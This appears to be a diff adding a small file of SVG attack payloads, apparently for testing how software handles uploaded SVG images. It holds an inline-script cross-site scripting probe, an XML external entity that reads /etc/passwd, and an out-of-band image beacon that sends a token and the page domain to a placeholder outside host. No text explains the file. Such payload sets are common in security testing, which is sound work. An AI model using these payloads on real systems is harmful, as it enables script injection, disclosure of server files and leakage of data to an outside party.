@@ -1,0 +1,22 @@
+<?xml version="1.0"?>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <script>alert('XSS')</script>
+</svg>
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image xlink:href="data:image/svg+xml;base64,PHNvZnQ+PC9zb2Z0Pg=="/>
+</svg>
+
+
+<?xml version="1.0"?>
+<!DOCTYPE root [
+  <!ENTITY ext SYSTEM "file:///etc/passwd">
+]>
+<svg xmlns="http://www.w3.org/2000/svg">
+  <text>&ext;</text>
+</svg>
+
+
+<svg xmlns="http://www.w3.org/2000/svg">
+  <image xlink:href="http://{{OOB_DOMAIN}}/collect?u={{TOKEN}}&d=document.domain" width="1" height="1"/>
+</svg>
